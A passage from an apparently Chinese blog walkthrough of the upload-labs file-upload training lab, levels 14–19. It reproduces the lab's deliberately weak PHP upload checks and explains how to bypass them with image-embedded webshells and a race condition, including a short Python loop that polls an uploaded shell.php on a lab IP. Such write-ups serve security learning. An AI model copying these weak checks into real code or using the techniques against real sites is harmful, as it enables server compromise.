class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传<br>会判断强两个字节的来确定上传文件的后缀是否为白名单里的,需要上传图片马配合文件包含漏洞<br>上传图片马<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151405347.png?token=ARYCSASXZ4555YJ443DI4V3CQCMEU"><br>点击文件包含漏铜<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151405579.png?token=ARYCSAWV6HXV2F2X3Q5SKV3CQCMFS"></p></li></ul><h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><ul><li>源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>上传<br>在上关的基础上,校验图片的大小,依旧可以和上关一样使用图片马绕过</li></ul><h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><ul><li>源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>上传<br>在上关的基础上再检查后缀,依旧使用图片马绕过</li></ul><h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><ul><li>源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>上传<br>同上,图片马传就完事了</li></ul><h1 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传<br>代码审计,对上传的文件的后缀进行对比,如果不在白名单之内就删除,没有文件包含漏洞,此处利用条件竞争<br>文件上传,再被校验中间是有一个过程的,如果我们在上传后立即访问,占用文件,文件在被使用状态是不可被删除的<br>利用burp重复发包,不设置payload<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151405750.png?token=ARYCSAWD23GMFDRNJYLWY7TCQCMHA"></p><p>利用脚本去重复访问上传的webshell路径</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    resp = requests.get(url=<span class="string">&#x27;http://10.20.146.195/upload/shell.php&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;攻击成功&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h1 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h1><ul><li>源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 